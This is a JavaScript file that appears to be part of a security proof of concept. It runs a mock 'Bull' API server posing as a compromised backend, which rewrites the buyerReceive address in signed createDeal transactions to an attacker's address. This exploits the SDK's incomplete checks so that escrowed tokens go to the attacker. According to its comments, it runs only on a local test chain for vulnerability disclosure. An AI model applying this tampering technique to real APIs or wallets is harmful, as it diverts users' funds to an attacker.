// Mock Bull API server — plays the role of a COMPROMISED / MALICIOUS Bull API.
// It answers the two endpoints the real Bull SDK uses in open()/fund():
//   POST /api/v1/settle       -> signed fee quote + createDeal transaction
//   GET  /api/v1/settle/:id   -> fund steps for a deal
// The TAMPER: in the createDeal it names the ATTACKER as `buyerReceive`
// instead of the buyer the user asked for. Everything else (seller, token,
// amounts, fee) is exactly what the user asked for — so the SDK's open()
// checks (buyer, seller, feeBps only) all pass, and the deal settles with
// the tokens going to the attacker instead of the paying buyer.
// The fee quote is signed with the REAL feeSigner key (the PoC deploys the
// escrow with a feeSigner it controls), so the on-chain quote check passes
// exactly as it would against the real Bull backend.
// No real Bull infrastructure is involved; everything runs on a local Anvil
// chain against the REAL BullEscrow source (verified on Sourcify, chain 4663).
import http from "node:http";
import {
  encodeAbiParameters, encodeFunctionData, keccak256, parseAbi,
  parseEther, parseUnits,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";

const ZERO = "0x0000000000000000000000000000000000000000";
const ESCROW_ABI = parseAbi([
  "function createDeal((address seller,address sellerPayout,address buyerReceive,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline) p, (uint16 feeBps,uint64 expiry,bytes sig) q) returns (uint256 id)",
  "function fundPayment(uint256 id) payable",
  "function nextId() view returns (uint256)",
]);
const DEAL_PARAMS_TYPE = {
  type: "tuple",
  components: [
    { name: "seller", type: "address" },
    { name: "sellerPayout", type: "address" },
    { name: "buyerReceive", type: "address" },
    { name: "sellToken", type: "address" },
    { name: "sellAmount", type: "uint256" },
    { name: "payToken", type: "address" },
    { name: "payAmount", type: "uint256" },
    { name: "deadline", type: "uint64" },
  ],
};

export function startMockApi({ port, escrow, feeSignerKey, attacker, victim, getDealId }) {
  const feeSigner = privateKeyToAccount(feeSignerKey);
  const server = http.createServer((req, res) => {
    const send = (obj) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(obj));
    };
    if (req.method === "POST" && req.url === "/api/v1/settle") {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", async () => {
        const b = JSON.parse(body || "{}");
        const now = Math.floor(Date.now() / 1000);
        // Build the deal params from what the user asked — EXCEPT buyerReceive.
        const params = {
          seller: b.seller,
          sellerPayout: b.sellerPayout || b.seller,
          buyerReceive: attacker, // <-- TAMPERED: tokens will go to the attacker
          sellToken: b.sellToken,
          sellAmount: parseUnits(String(b.sellAmount), 18),
          payToken: ZERO, // payAsset "eth"
          payAmount: parseEther(String(b.payAmount)),
          deadline: BigInt(now + (Number(b.deadlineHours) || 24) * 3600),
        };
        const feeBps = 250;
        const expiry = BigInt(now + 3600);
        // Quote hash exactly as BullEscrow._quoteHash computes it.
        const ph = keccak256(encodeAbiParameters([DEAL_PARAMS_TYPE], [params]));
        const h = keccak256(encodeAbiParameters(
          [{ type: "uint256" }, { type: "address" }, { type: "address" }, { type: "bytes32" }, { type: "uint16" }, { type: "uint64" }],
          [31337n, escrow, b.buyer, ph, feeBps, expiry],
        ));
        const sig = await feeSigner.signMessage({ message: { raw: h } });
        const data = encodeFunctionData({
          abi: ESCROW_ABI, functionName: "createDeal",
          args: [params, { feeBps, expiry, sig }],
        });
        console.log("[mock-api] POST /api/v1/settle — user asked buyerReceive =", b.buyerReceive || "(default: buyer)");
        console.log("[mock-api] MALICIOUS response: buyerReceive rewritten to attacker", attacker);
        send({ transaction: { to: escrow, data, value: "0" } });
      });
      return;
    }
    if (req.method === "GET" && req.url.startsWith("/api/v1/settle/")) {
      (async () => {
        const dealId = await getDealId();
        const data = encodeFunctionData({ abi: ESCROW_ABI, functionName: "fundPayment", args: [dealId] });
        console.log("[mock-api] GET /api/v1/settle/… — returning fundPayment step for deal", dealId.toString());
        send({
          buyerSteps: [{ from: victim, transaction: { to: escrow, data, value: parseEther("0.5").toString() } }],
          sellerSteps: [],
        });
      })();
      return;
    }
    res.writeHead(404, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "not found" }));
  });
  return new Promise((resolve) => server.listen(port, "127.0.0.1", () => resolve(server)));
}
